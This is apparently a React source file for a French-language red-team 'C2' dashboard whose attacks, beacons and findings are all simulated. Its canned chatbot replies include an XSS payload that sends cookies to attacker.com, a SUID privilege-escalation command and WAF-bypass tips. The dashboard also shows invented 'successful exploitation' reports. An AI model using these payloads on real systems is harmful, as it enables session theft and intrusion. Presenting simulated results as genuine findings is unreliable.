'use client'
import React, { useState, useEffect, useRef } from 'react'
import { generateFullEnterpriseReport, FullPentestReport } from '@/lib/generateReport'
import { OFFENSIVE_TOOLS, ToolModule } from '@/lib/offensiveTools'
import { ShieldAlert, Terminal, FileText, CheckCircle2, Download, Database, History, Play, Camera, Send, Sparkles, Share2, Cpu, Radio, Lock } from 'lucide-react'

interface SavedReportRecord extends FullPentestReport {
  id: string
  createdAt: string
  screenshot?: string
}

interface ActiveBeacon {
  id: string
  target: string
  status: 'CONNECTED' | 'SLEEPING' | 'EXFILTRATING'
  privilege: 'SYSTEM' | 'ROOT' | 'WWW-DATA'
  lastSeen: string
}

interface UserAccount {
  name: string
  email: string
  role: 'Administrateur' | 'RedTeam Commander' | 'Auditeur Senior' | 'Client'
}

interface ChatMessage {
  sender: 'user' | 'ai'
  text: string
}

export default function RedTeamDashboard() {
  const [activeTab, setActiveTab] = useState<string>('dashboard')
  const [target, setTarget] = useState('')
  const [scanning, setScanning] = useState(false)
  const [logs, setLogs] = useState<string[]>([])
  const [scanDone, setScanDone] = useState(false)
  const [currentReport, setCurrentReport] = useState<FullPentestReport | null>(null)
  const [capturedScreenshot, setCapturedScreenshot] = useState<string | null>(null)
  
  const [savedReports, setSavedReports] = useState<SavedReportRecord[]>([])
  const [beacons, setBeacons] = useState<ActiveBeacon[]>([
    { id: 'bcn_01', target: 'dc01.corp.local', status: 'CONNECTED', privilege: 'SYSTEM', lastSeen: 'Il y a 2s' },
    { id: 'bcn_02', target: 'web-prod-04.aws', status: 'EXFILTRATING', privilege: 'ROOT', lastSeen: 'Il y a 14s' }
  ])

  const consoleRef = useRef<HTMLDivElement>(null)

  const [currentUser] = useState<UserAccount>({
    name: 'Senior Operator [0x99]',
    email: 'operator@cybershield.corp',
    role: 'RedTeam Commander'
  })

  // Chatbot IA
  const [chatInput, setChatInput] = useState('')
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([
    { sender: 'ai', text: "Moteur C2 CyberShield initialisé. Prêt pour l'orchestration des charges offensives, l'analyse MITRE ATT&CK et l'assistance technique." }
  ])

  useEffect(() => {
    const localReports = localStorage.getItem('cybershield_saved_reports')
    if (localReports) {
      try { setSavedReports(JSON.parse(localReports)) } catch (e) { console.error(e) }
    }
  }, [])

  const handleSocialShare = (platform: 'linkedin' | 'x' | 'telegram' | 'whatsapp') => {
    const text = encodeURIComponent(`Opération RedTeam validée sur ${target} via CyberShield Enterprise C2. #RedTeam #CyberSecurity #OffensiveSecurity`)
    const url = encodeURIComponent(window.location.href)
    let shareUrl = ''
    if (platform === 'linkedin') shareUrl = `https://www.linkedin.com/sharing/share-offsite/?url=${url}`
    else if (platform === 'x') shareUrl = `https://twitter.com/intent/tweet?text=${text}&url=${url}`
    else if (platform === 'telegram') shareUrl = `https://t.me/share/url?url=${url}&text=${text}`
    else if (platform === 'whatsapp') shareUrl = `https://api.whatsapp.com/send?text=${text}%20${url}`
    window.open(shareUrl, '_blank')
  }

  const handleSendChatMessage = (e: React.FormEvent) => {
    e.preventDefault()
    if (!chatInput.trim()) return
    setChatMessages(prev => [...prev, { sender: 'user', text: chatInput }])
    const query = chatInput.toLowerCase()
    setChatInput('')

    setTimeout(() => {
      let response = "Requête analysée par le modèle tactique. Veillez à respecter le cadre des Rules of Engagement (RoE)."
      if (query.includes('bypass') || query.includes('waf')) {
        response = "Pour contourner le WAF, appliquez l'encodage URL en double, utilisez des fragments HTTP/2 ou modifiez l'en-tête User-Agent."
      } else if (query.includes('privilege') || query.includes('escalade')) {
        response = "Vérifiez les binaires SUID mal configurés (`find / -perm -4000 2>/dev/null`) ou les tokens SeImpersonatePrivilege sous Windows."
      } else if (query.includes('payload') || query.includes('xss')) {
        response = "Exemple de payload sécurisé pour test DAST : <script>fetch('http://attacker.com?cookie='+document.cookie)</script>"
      }
      setChatMessages(prev => [...prev, { sender: 'ai', text: response }])
    }, 700)
  }

  const captureConsoleScreenshot = async () => {
    if (!consoleRef.current) return null
    try {
      const html2canvas = (await import('html2canvas')).default
      const canvas = await html2canvas(consoleRef.current, { background: '#020617', logging: false })
      const imgData = canvas.toDataURL('image/png')
      setCapturedScreenshot(imgData)
      return imgData
    } catch (error) {
      console.error(error)
      return null
    }
  }

  const handleSaveReport = (reportToSave: FullPentestReport, screenshotData?: string | null) => {
    const newRecord: SavedReportRecord = {
      ...reportToSave,
      id: `rep_${Date.now()}`,
      createdAt: new Date().toLocaleString('fr-FR'),
      screenshot: screenshotData || undefined
    }
    const updatedList = [newRecord, ...savedReports]
    setSavedReports(updatedList)
    localStorage.setItem('cybershield_saved_reports', JSON.stringify(updatedList))
    alert("Rapport tactique archivé avec succès dans le coffre sécurisé !")
  }

  const executeToolAdvanced = (tool: ToolModule) => {
    if (!target.trim()) {
      alert('Veuillez spécifier une cible (IP, FQDN ou CIDR) valide.')
      return
    }
    setScanning(true)
    setScanDone(false)
    setCapturedScreenshot(null)

    const rawCmd = tool.commandTemplate || tool.defaultCommand || 'echo "No command specified"'
    const finalCmd = rawCmd.replace('{target}', target)

    const executionFlow = [
      `[C2-OPERATOR@cybershield-core ~]# session_spawn --target ${target} --module ${tool.id}`,
      `[+] Établissement du tunnel chiffré AES-256 vers le nœud d'exécution...`,
      `[+] Injection de la commande binaire : ${finalCmd}`,
      `[INFO] [MITRE ATT&CK: ${tool.mitreTechnique}] — Analyse de la surface d'attaque active.`,
      `[>] Envoi des paquets de sondage et écoute des bannières de réponse...`,
      `[CRITICAL] Vulnérabilité majeure validée sur ${target} [Niveau de Risque : ${tool.riskLevel}]`,
      `[+] Génération automatique du rapport de preuve et des indicateurs de compromission (IOCs)...`
    ]

    setLogs([`[+] Initialisation de la session offensive avancée pour ${tool.name}...`])

    executionFlow.forEach((line, idx) => {
      setTimeout(async () => {
        setLogs(prev => [...prev, line])
        if (idx === executionFlow.length - 1) {
          setScanning(false)
          setScanDone(true)

          setBeacons(prev => [
            { id: `bcn_${Date.now().toString().slice(-4)}`, target: target, status: 'CONNECTED', privilege: tool.riskLevel === 'CRITICAL' ? 'SYSTEM' : 'WWW-DATA', lastSeen: 'À l\'instant' },
            ...prev
          ])

          setTimeout(async () => { await captureConsoleScreenshot() }, 400)

          const generated: FullPentestReport = {
            clientName: "Enterprise Global Infrastructure",
            targetScope: target,
            auditor: `${currentUser.name} (${currentUser.role})`,
            date: new Date().toLocaleDateString('fr-FR'),
            findings: [
              { 
                severity: tool.riskLevel, 
                cvss: tool.riskLevel === 'CRITICAL' ? '9.8' : '8.5', 
                vector: tool.category, 
                title: `Exploitation réussie : ${tool.name}`, 
                description: `L'outil ${tool.name} a exploité avec succès la cible ${target} en utilisant la technique MITRE ${tool.mitreTechnique}.`, 
                remediation: 'Isoler immédiatement la ressource, révoquer les accès compromis et appliquer les correctifs éditeur.' 
              }
            ]
          }
          setCurrentReport(generated)
        }
      }, (idx + 1) * 700)
    })
  }
  const activeTool = OFFENSIVE_TOOLS.find(t => t.id === activeTab)

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col justify-between font-sans selection:bg-cyan-500 selection:text-white">
      
      {/* Top Header Navigation */}
      <header className="border-b border-slate-800 bg-slate-900/95 backdrop-blur-md sticky top-0 z-50 px-6 py-3.5 flex justify-between items-center shadow-xl">
        <div className="flex items-center gap-3">
          <div className="p-2 bg-cyan-500/10 border border-cyan-500/30 rounded-lg">
            <ShieldAlert className="w-6 h-6 text-cyan-400 animate-pulse" />
          </div>
          <div>
            <h1 className="font-extrabold text-sm tracking-widest text-white">CYBERSHIELD <span className="text-cyan-400">ENTERPRISE C2</span></h1>
            <p className="text-[10px] text-slate-400 font-mono">Plateforme Avancée d'Armement & Simulation de Menaces</p>
          </div>
        </div>

        {/* Navigation Dynamique & Intégration OFFENSIVE_TOOLS */}
        <div className="hidden xl:flex items-center gap-1.5 text-xs font-semibold overflow-x-auto py-1">
          <button onClick={() => setActiveTab('dashboard')} className={`px-3 py-1.5 rounded transition-all whitespace-nowrap ${activeTab === 'dashboard' ? 'bg-cyan-600 text-white shadow-lg shadow-cyan-900/40' : 'bg-slate-900 text-slate-400 hover:text-white'}`}>Command Center</button>
          <button onClick={() => setActiveTab('reports')} className={`px-3 py-1.5 rounded transition-all flex items-center gap-1 whitespace-nowrap ${activeTab === 'reports' ? 'bg-cyan-600 text-white shadow-lg' : 'bg-slate-900 text-slate-400 hover:text-white'}`}>
            <Database className="w-3.5 h-3.5" /> Coffre ({savedReports.length})
          </button>

          {OFFENSIVE_TOOLS.map(tool => (
            <button 
              key={tool.id} 
              onClick={() => setActiveTab(tool.id)} 
              className={`px-3 py-1.5 rounded transition-all whitespace-nowrap border ${activeTab === tool.id ? 'bg-cyan-600 text-white border-cyan-400 shadow-lg' : 'bg-slate-900 text-cyan-300 border-cyan-500/20 hover:bg-cyan-950/40'}`}
              title={tool.name}
            >
              {tool.name.split(' ')[0]}
            </button>
          ))}

          <button onClick={() => setActiveTab('chatbot')} className={`px-3 py-1.5 rounded transition-all whitespace-nowrap flex items-center gap-1 border ${activeTab === 'chatbot' ? 'bg-cyan-600 text-white border-cyan-400' : 'bg-slate-900 text-cyan-300 border-cyan-500/20'}`}>
            <Sparkles className="w-3.5 h-3.5" /> Tactics AI
          </button>
          <div className="ml-2 pl-3 border-l border-slate-800 flex items-center gap-2 text-[11px] text-slate-300 font-mono">
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
            {currentUser.name}
          </div>
        </div>
      </header>

      {/* Main Workspace */}
      <main className="max-w-7xl w-full mx-auto p-6 flex-grow space-y-6">
        
        {activeTab === 'dashboard' && (
          <div className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
              <div className="bg-slate-900 border border-slate-800 p-4 rounded-xl flex items-center justify-between shadow-lg">
                <div>
                  <p className="text-[10px] text-slate-400 font-mono uppercase tracking-wider">Beacons Actifs</p>
                  <h3 className="text-2xl font-black text-white mt-1">{beacons.length} Nœuds</h3>
                </div>
                <Radio className="w-8 h-8 text-cyan-400 animate-pulse" />
              </div>
              <div className="bg-slate-900 border border-slate-800 p-4 rounded-xl flex items-center justify-between shadow-lg">
                <div>
                  <p className="text-[10px] text-slate-400 font-mono uppercase tracking-wider">Arsenal Offensif</p>
                  <h3 className="text-2xl font-black text-cyan-400 mt-1">{OFFENSIVE_TOOLS.length} Modules</h3>
                </div>
                <Cpu className="w-8 h-8 text-cyan-400" />
              </div>
              <div className="bg-slate-900 border border-slate-800 p-4 rounded-xl flex items-center justify-between shadow-lg">
                <div>
                  <p className="text-[10px] text-slate-400 font-mono uppercase tracking-wider">Rapports Archivés</p>
                  <h3 className="text-2xl font-black text-emerald-400 mt-1">{savedReports.length} Dossiers</h3>
                </div>
                <Database className="w-8 h-8 text-emerald-400" />
              </div>
              <div className="bg-slate-900 border border-slate-800 p-4 rounded-xl flex items-center justify-between shadow-lg">
                <div>
                  <p className="text-[10px] text-slate-400 font-mono uppercase tracking-wider">Statut Sécurité C2</p>
                  <h3 className="text-lg font-black text-cyan-400 mt-1">Chiffré AES</h3>
                </div>
                <Lock className="w-8 h-8 text-cyan-400" />
              </div>
            </div>

            <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl">
              <h3 className="text-sm font-bold text-cyan-400 mb-4 flex items-center gap-2 uppercase tracking-wider font-mono">
                <Radio className="w-4 h-4" /> Télémétrie des Agents & Beacons Actifs
              </h3>
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs font-mono">
                  <thead>
                    <tr className="border-b border-slate-800 text-slate-400">
                      <th className="pb-3">ID Beacon</th>
                      <th className="pb-3">Cible / Hôte</th>
                      <th className="pb-3">Privilège</th>
                      <th className="pb-3">Statut Tunnel</th>
                      <th className="pb-3">Dernier Contact</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/60">
                    {beacons.map(bcn => (
                      <tr key={bcn.id} className="hover:bg-slate-950/50">
                        <td className="py-3 text-cyan-300 font-bold">{bcn.id}</td>
                        <td className="py-3 text-white">{bcn.target}</td>
                        <td className="py-3"><span className={`px-2 py-0.5 rounded text-[10px] ${bcn.privilege === 'SYSTEM' ? 'bg-red-500/10 text-red-400 border border-red-500/30 font-bold' : 'bg-amber-500/10 text-amber-400'}`}>{bcn.privilege}</span></td>
                        <td className="py-3 text-emerald-400">{bcn.status}</td>
                        <td className="py-3 text-slate-400">{bcn.lastSeen}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            <div>
              <h3 className="text-sm font-bold text-slate-200 mb-4 uppercase tracking-wider font-mono">Arsenal d'Attaque Intégral ({OFFENSIVE_TOOLS.length} modules)</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                {OFFENSIVE_TOOLS.map(tool => (
                  <div key={tool.id} onClick={() => setActiveTab(tool.id)} className="bg-slate-900 border border-cyan-500/30 hover:border-cyan-400 cursor-pointer rounded-xl p-6 transition-all shadow-xl group relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-24 h-24 bg-cyan-500/5 rounded-full blur-2xl group-hover:bg-cyan-500/10 transition-all"></div>
                    <div className="flex justify-between items-start mb-3">
                      <span className="text-[10px] bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 px-2 py-0.5 rounded font-mono">{tool.category}</span>
                      <span className={`text-[10px] px-2 py-0.5 rounded font-bold font-mono ${tool.riskLevel === 'CRITICAL' ? 'bg-red-500/10 text-red-400 border border-red-500/30' : 'bg-amber-500/10 text-amber-400'}`}>{tool.riskLevel}</span>
                    </div>
                    <h4 className="font-bold text-base text-white mb-1 group-hover:text-cyan-300 transition-colors">{tool.name}</h4>
                    <p className="text-xs text-slate-400 mb-4">{tool.description}</p>
                    <div className="flex items-center justify-between text-[10px] text-slate-500 font-mono border-t border-slate-800 pt-3">
                      <span>MITRE : {tool.mitreTechnique.split(' ')[0]}</span>
                      <span className="text-cyan-400 group-hover:translate-x-1 transition-transform">Lancer l'outil →</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {activeTab === 'chatbot' && (
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl flex flex-col h-[600px]">
            <h2 className="text-xl font-bold mb-2 text-cyan-400 flex items-center gap-2 font-mono">
              <Sparkles className="w-5 h-5" /> CYBERSHIELD TACTICAL AI (Assistant Offensif)
            </h2>
            <p className="text-xs text-slate-400 mb-4">Générez des chaînes d'exploitation, analysez des vecteurs MITRE ATT&CK et obtenez des stratégies d'évasion en direct.</p>
            
            <div className="flex-grow bg-black border border-slate-800 rounded-lg p-4 overflow-y-auto space-y-3 mb-4 font-mono text-xs">
              {chatMessages.map((msg, idx) => (
                <div key={idx} className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                  <div className={`max-w-xl p-3.5 rounded-lg ${msg.sender === 'user' ? 'bg-cyan-950 text-white border border-cyan-500/30' : 'bg-slate-900 text-slate-200 border border-slate-800'}`}>
                    <span className="block font-bold text-[10px] mb-1 text-cyan-400">{msg.sender === 'user' ? 'Opérateur' : 'Tactical AI Core'}</span>
                    <p className="leading-relaxed">{msg.text}</p>
                  </div>
                </div>
              ))}
            </div>

            <form onSubmit={handleSendChatMessage} className="flex gap-2">
              <input 
                type="text"
                value={chatInput}
                onChange={e => setChatInput(e.target.value)}
                placeholder="Ex: Comment contourner un WAF sur une injection SQL ? / Stratégie d'élévation de privilèges..."
                className="flex-grow bg-slate-950 border border-slate-700 rounded-lg px-4 py-3 text-sm text-white focus:border-cyan-500 outline-none font-mono"
              />
              <button type="submit" className="bg-cyan-600 hover:bg-cyan-500 text-white font-bold px-6 py-3 rounded-lg flex items-center gap-2 text-sm shadow-lg shadow-cyan-900/40">
                <Send className="w-4 h-4" /> Transmettre
              </button>
            </form>
          </div>
        )}

        {activeTab === 'reports' && (
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl">
            <h2 className="text-xl font-bold mb-2 text-cyan-400 flex items-center gap-2 font-mono">
              <History className="w-5 h-5" /> Coffre-Fort des Rapports & Preuves Visuelles
            </h2>
            <p className="text-xs text-slate-400 mb-6">Archive cryptée contenant l'ensemble des interventions et rapports d'audit PDF.</p>

            {savedReports.length === 0 ? (
              <div className="text-center py-16 border border-dashed border-slate-800 rounded-lg text-slate-500 text-sm font-mono">
                Aucun rapport archivé. Exécutez un module d'attaque pour générer les premiers livrables.
              </div>
            ) : (
              <div className="space-y-4">
                {savedReports.map((rep) => (
                  <div key={rep.id} className="bg-slate-950 border border-slate-800 p-4 rounded-xl flex flex-col md:flex-row justify-between items-center gap-4">
                    <div className="flex items-center gap-4">
                      {rep.screenshot && (
                        <img src={rep.screenshot} alt="Preuve console" className="w-28 h-16 object-cover border border-cyan-500/30 rounded shadow-md" />
                      )}
                      <div>
                        <div className="flex items-center gap-2 mb-1">
                          <span className="font-bold text-white text-sm font-mono">Cible : {rep.targetScope}</span>
                          <span className="text-[10px] bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 px-2 py-0.5 rounded font-mono">{rep.clientName}</span>
                        </div>
                        <p className="text-xs text-slate-400">Généré le {rep.createdAt} par {rep.auditor} — <strong className="text-red-400">{rep.findings.length} failles critiques</strong></p>
                      </div>
                    </div>
                    <button 
                      onClick={() => generateFullEnterpriseReport(rep)}
                      className="bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-2.5 px-5 rounded-lg text-xs transition-colors flex items-center gap-1.5 shadow-lg whitespace-nowrap"
                    >
                      <Download className="w-4 h-4" /> Télécharger Rapport PDF
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {activeTool && (
          <>
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-2xl space-y-6">
              <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 border-b border-slate-800 pb-4">
                <div>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-[10px] bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 px-2 py-0.5 rounded font-mono">{activeTool.category}</span>
                    <span className="text-[10px] bg-red-500/10 text-red-400 border border-red-500/30 px-2 py-0.5 rounded font-mono">MITRE: {activeTool.mitreTechnique}</span>
                  </div>
                  <h2 className="text-xl font-extrabold text-white font-mono flex items-center gap-2">
                    <Terminal className="w-5 h-5 text-cyan-400" /> {activeTool.name}
                  </h2>
                  <p className="text-xs text-slate-400 mt-1">{activeTool.description}</p>
                </div>
                {scanDone && (
                  <span className="text-xs bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 px-3 py-1.5 rounded-full flex items-center gap-1 font-mono shadow">
                    <Camera className="w-4 h-4" /> Preuve Console Capturée
                  </span>
                )}
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="md:col-span-2">
                  <label className="block text-xs font-semibold uppercase text-slate-400 mb-2 font-mono">Cible (Substitut <code>{'{target}'}</code>)</label>
                  <input 
                    type="text" 
                    value={target} 
                    onChange={e => setTarget(e.target.value)} 
                    placeholder="ex: 10.0.0.15 ou target-corp.com" 
                    className="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-sm text-white focus:border-cyan-500 outline-none font-mono shadow-inner" 
                  />
                </div>
                <div className="flex items-end">
                  <button 
                    onClick={() => executeToolAdvanced(activeTool)}
                    disabled={scanning}
                    className="w-full bg-cyan-600 hover:bg-cyan-500 disabled:bg-slate-800 text-white font-bold py-3 px-4 rounded-lg shadow-xl shadow-cyan-900/40 text-sm transition-all flex items-center justify-center gap-2"
                  >
                    <Play className="w-4 h-4" /> {scanning ? 'Exécution C2 en cours...' : `Déclencher l'Attaque`}
                  </button>
                </div>
              </div>

              <div ref={consoleRef} className="bg-black border border-slate-800 rounded-xl p-5 h-72 overflow-y-auto font-mono text-xs text-green-400 shadow-inner relative space-y-1">
                {logs.length === 0 && <span className="text-slate-600">Système prêt. Spécifiez une cible et lancez l'orchestration de l'outil...</span>}
                {logs.map((log, idx) => (
                  <div key={idx} className={`${log.includes('[CRITICAL]') ? 'text-red-400 font-bold bg-red-950/20 px-2 py-0.5 rounded border border-red-500/20' : log.includes('[INFO]') ? 'text-cyan-300 font-bold' : log.includes('$') ? 'text-white font-bold' : ''}`}>
                    {log}
                  </div>
                ))}
              </div>
            </div>

            {scanDone && currentReport && (
              <div className="bg-gradient-to-r from-slate-900 via-cyan-950/60 to-slate-900 border border-cyan-500/40 p-6 rounded-xl shadow-2xl flex flex-col md:flex-row justify-between items-center gap-6 animate-fade-in">
                <div className="flex items-center gap-4">
                  <CheckCircle2 className="w-10 h-10 text-emerald-400 flex-shrink-0" />
                  <div>
                    <h3 className="font-extrabold text-lg text-white font-mono">Mission Exécutée avec Succès</h3>
                    <p className="text-xs text-slate-300">Preuve visuelle immortalisée, beacon enregistré et rapport prêt pour extraction.</p>
                  </div>
                </div>

                <div className="flex flex-wrap items-center gap-2.5">
                  <button onClick={() => handleSocialShare('linkedin')} className="bg-[#0A66C2] hover:bg-[#084e96] text-white py-2.5 px-3.5 rounded-lg text-xs font-bold transition-all shadow"><Share2 className="w-3.5 h-3.5 inline mr-1" /> LinkedIn</button>
                  <button onClick={() => handleSocialShare('x')} className="bg-slate-800 hover:bg-slate-700 text-white border border-slate-700 py-2.5 px-3 rounded-lg text-xs font-bold transition-all shadow">X</button>
                  <button onClick={() => handleSocialShare('telegram')} className="bg-[#2AABEE] hover:bg-[#228cca] text-white py-2.5 px-3 rounded-lg text-xs font-bold transition-all shadow">Telegram</button>
                  <button onClick={() => handleSocialShare('whatsapp')} className="bg-[#25D366] hover:bg-[#1ebd59] text-white py-2.5 px-3 rounded-lg text-xs font-bold transition-all shadow">WhatsApp</button>

                  <button onClick={() => handleSaveReport(currentReport, capturedScreenshot)} className="bg-slate-800 hover:bg-slate-700 text-cyan-400 border border-cyan-500/30 font-bold py-2.5 px-4 rounded-lg shadow text-xs transition-all">
                    <Database className="w-3.5 h-3.5 inline mr-1" /> Archiver
                  </button>
                  <button onClick={() => generateFullEnterpriseReport(currentReport)} className="bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-2.5 px-6 rounded-lg shadow-xl text-xs transition-all">
                    <FileText className="w-3.5 h-3.5 inline mr-1" /> PDF Enterprise Pro
                  </button>
                </div>
              </div>
            )}
          </>
        )}

      </main>

      {/* Footer */}
      <footer className="border-t border-slate-800 bg-slate-900/90 py-6 px-6 mt-12 text-center text-xs text-slate-400 font-mono">
        <p>CYBERSHIELD ENTERPRISE C2 SUITE © 2026 — Plateforme d'armement offensif et de simulation de cybermenaces avancées.</p>
      </footer>

    </div>
  )
}